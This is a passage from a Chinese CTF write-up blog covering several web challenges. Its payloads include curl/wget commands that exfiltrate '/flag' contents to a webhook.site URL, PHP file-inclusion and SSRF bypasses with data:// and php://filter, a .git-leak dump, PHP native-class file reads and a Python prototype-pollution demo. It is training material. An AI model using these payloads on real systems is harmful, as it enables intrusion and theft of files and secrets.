class=\"string\">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class=\"string\">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class=\"string\">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>, <span class=\"string\">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;093f65e080a295f8076b1c5722a46aa2&quot;</span>, <span class=\"string\">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class=\"string\">&quot;d82c8d1619ad8176d665453cfb2e55f0&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class=\"string\">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class=\"string\">&quot;07e1cd7dca89a1678042477183b7ac3f&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;a1d0c6e83f027327d8461063f4ac58a6&quot;</span>, <span class=\"string\">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>, <span class=\"string\">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class=\"string\">&quot;5fd0b37cd7dbbb00f97ba6ce92bf5add&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;</span>, <span class=\"string\">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class=\"string\">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>, <span class=\"string\">&quot;da4fb5c6e93e74d3df8527599fa62642&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>, <span class=\"string\">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>, <span class=\"string\">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>, <span class=\"string\">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class=\"string\">&quot;98f13708210194c475687be6106a3b84&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;3c59dc048e8850243be8079a5c74d079&quot;</span>, <span class=\"string\">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class=\"string\">&quot;4e732ced3463d06de0ca9a15b6153677&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class=\"string\">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span></span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 用于存储还原出的字符</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$md5</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$j</span> = <span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt; <span class=\"number\">256</span>; <span class=\"variable\">$j</span>++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 计算异或操作后的值</span></span><br><span class=\"line\">        <span class=\"variable\">$xor_result</span> = <span class=\"variable\">$j</span> ^ <span class=\"variable\">$i</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 计算MD5值</span></span><br><span class=\"line\">        <span class=\"variable\">$calculated_md5</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$xor_result</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 如果计算出的MD5值与给定的MD5值匹配，则找到了正确的字符</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$calculated_md5</span> === <span class=\"variable\">$md5</span>[<span class=\"variable\">$i</span>]) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$flag</span> .= <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Flag: &quot;</span> . <span class=\"variable\">$flag</span> . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"听不见我的声音\"><a href=\"#听不见我的声音\" class=\"headerlink\" title=\"听不见我的声音\"></a>听不见我的声音</h2><h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><h4 id=\"cmd-反引号的利用\"><a href=\"#cmd-反引号的利用\" class=\"headerlink\" title=\"$(cmd)  反引号的利用\"></a>$(cmd)  反引号的利用</h4><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241013185802672.png\" alt=\"image-20241013185802672\"></p>\n<p>了解功能之后，我们可以使用数据外带网站</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`<span class=\"built_in\">cat</span> /flag`</span><br><span class=\"line\">curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/$(<span class=\"built_in\">cat</span> /flag)</span><br><span class=\"line\">wget https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`<span class=\"built_in\">cat</span> /flag`</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>将命令回显定向到指定文件中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /flag &gt; 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>访问1.txt即可</p>\n<h2 id=\"Aura酱的礼物\"><a href=\"#Aura酱的礼物\" class=\"headerlink\" title=\"Aura酱的礼物\"></a>Aura酱的礼物</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">// Aura 酱，欢迎回家~</span></span><br><span class=\"line\"><span class=\"comment\">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class=\"line\"><span class=\"variable\">$pen</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pen&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$pen</span>) !== <span class=\"string\">&#x27;Aura&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class=\"line\"><span class=\"variable\">$challenge</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$challenge</span>, <span class=\"string\">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$blog_content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$challenge</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$blog_content</span>, <span class=\"string\">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class=\"line\"><span class=\"variable\">$gift</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gift&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$gift</span>); </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一部分-2\"><a href=\"#第一部分-2\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h3><h4 id=\"data-写入\"><a href=\"#data-写入\" class=\"headerlink\" title=\"data:&#x2F;&#x2F;写入\"></a>data:&#x2F;&#x2F;写入</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$pen</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pen&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$pen</span>) !== <span class=\"string\">&#x27;Aura&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">pen=data://text/plain,Aura</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第二部分-2\"><a href=\"#第二部分-2\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$challenge</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$challenge</span>, <span class=\"string\">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$blog_content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$challenge</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$blog_content</span>, <span class=\"string\">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这里要注意是返回的是challange变量中的<strong>网页内容</strong>，并且网页内容是以<strong>字符串形式返回的</strong></p>\n<blockquote>\n<p>file_get_contents该函数可以从一个文件中读取其内容，并将内容以字符串的形式返回</p>\n</blockquote>\n<h4 id=\"url-解析规则\"><a href=\"#url-解析规则\" class=\"headerlink\" title=\"url@解析规则\"></a>url@解析规则</h4><p>在url中输入<a href=\"http://jasmineaura.github.io@baidu.com/\">http://jasmineaura.github.io@baidu.com</a>, 最终会解析为后者网站，即为<a href=\"http://baidu.com/\">http://baidu.com</a> </p>\n<h5 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h5><p>将自己服务器写入一个文件，文件内容只要包含<strong>已经收到Kengwang的礼物啦</strong>即可，post**@服务器地址&#x2F;xx.txt**</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">challenge=http://jasmineaura.github.io@121.43.126.238:8009/1.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241013221105114.png\" alt=\"image-20241013221105114\"><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241013221138526.png\" alt=\"image-20241013221138526\"></p>\n<h5 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h5><p>直接@本地回环地址即可，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">challenge=http://jasmineaura.github.io@127</span><br><span class=\"line\">.0.0.1 </span><br><span class=\"line\">0.0.0.0</span><br><span class=\"line\">localhost</span><br><span class=\"line\">gz.imxbt.cn:20100 靶场网址</span><br></pre></td></tr></table></figure>\n\n<p>因为**@这几个网址是访问它本身<strong>，并且这个靶机本身就包含已经</strong>收到Kengwang的礼物啦**，即可绕过</p>\n<h3 id=\"最终payload\"><a href=\"#最终payload\" class=\"headerlink\" title=\"最终payload\"></a>最终payload</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST：</span><br><span class=\"line\">pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@0.0.0.0&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Back-to-the-future\"><a href=\"#Back-to-the-future\" class=\"headerlink\" title=\"Back to the future\"></a>Back to the future</h2><h3 id=\"git文件泄露\"><a href=\"#git文件泄露\" class=\"headerlink\" title=\"git文件泄露\"></a>git文件泄露</h3><p>使用githacker</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">githacker --url http://gz.imxbt.cn:20119/.git --output basectf</span><br></pre></td></tr></table></figure>\n\n<p>在basectf文件夹下可以<strong>看到git泄露的文件，进入到目标文件夹下</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span> <span class=\"comment\">#查看git日志</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241014135916900.png\" alt=\"image-20241014135916900\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241014135947633.png\" alt=\"image-20241014135947633\"></p>\n<p>看到两条信息，可以看到<strong>第一条信息是添加什么东西</strong>，进而查看第一条信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout 9d85f10e0192ef630e10d7f876a117db41c30417</span><br></pre></td></tr></table></figure>\n\n<p>flag.txt文件恢复</p>\n<h2 id=\"flag直接读取不就行了？\"><a href=\"#flag直接读取不就行了？\" class=\"headerlink\" title=\"flag直接读取不就行了？\"></a>flag直接读取不就行了？</h2><h3 id=\"php原生类的使用\"><a href=\"#php原生类的使用\" class=\"headerlink\" title=\"php原生类的使用\"></a>php原生类的使用</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$J1ng</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;J&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Hong</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;H&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Keng</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;K&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Wang</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;W&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$dir</span> = <span class=\"keyword\">new</span> <span class=\"variable\">$Keng</span>(<span class=\"variable\">$Wang</span>);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"variable\">$dir</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>(<span class=\"variable\">$f</span> . <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$J1ng</span>(<span class=\"variable\">$Hong</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过于简单直接附上payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?K=FilesystemIterator&amp;W=glob:///secret/*</span><br><span class=\"line\">POST:</span><br><span class=\"line\">SplFileObject&amp;H=php://filter/convert.base64-encode/resource=/secret/f11444g.php</span><br></pre></td></tr></table></figure>\n\n<p>参考文章：<a href=\"https://xz.aliyun.com/t/13785?time__1311=GqmxuQi=e7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\">https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0</a></p>\n<h2 id=\"Jinja-Mark\"><a href=\"#Jinja-Mark\" class=\"headerlink\" title=\"Jinja Mark\"></a>Jinja Mark</h2><h3 id=\"python原型链污染\"><a href=\"#python原型链污染\" class=\"headerlink\" title=\"python原型链污染\"></a>python原型链污染</h3><blockquote>\n<p>python原型链污染例子</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">demo</span>():</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">B</span>:</span><br><span class=\"line\">    classa = <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">instance = A()</span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;a&quot;</span>: <span class=\"number\">4</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;B&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;classa&quot;</span>: <span class=\"number\">5</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(B.classa)  <span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)         <span class=\"comment\"># 1</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(B.classa)  <span class=\"comment\"># 5</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)         <span class=\"comment\"># 4</span></span><br></pre></td></tr></table></figure>\n\n<p>参考文章<a href=\"https://xz.aliyun.com/t/13072#toc-13\">https://xz.aliyun.com/t/13072#toc-13</a></p>\n<h3 id=\"绕过黑名单\"><a href=\"#绕过黑名单\" class=\"headerlink\" title=\"绕过黑名单\"></a>绕过黑名单</h3><p>进入到&#x2F;index <strong>进行ssti注入发现有黑名单</strong>，查看提示发现是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BLACKLIST_IN_index = [<span class=\"string\">&#x27;&#123;&#x27;</span>,<span class=\"string\">&#x27;&#125;&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/magic&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pollute</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.is_json:</span><br><span class=\"line\">            merge(json.loads(request.data), instance)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span 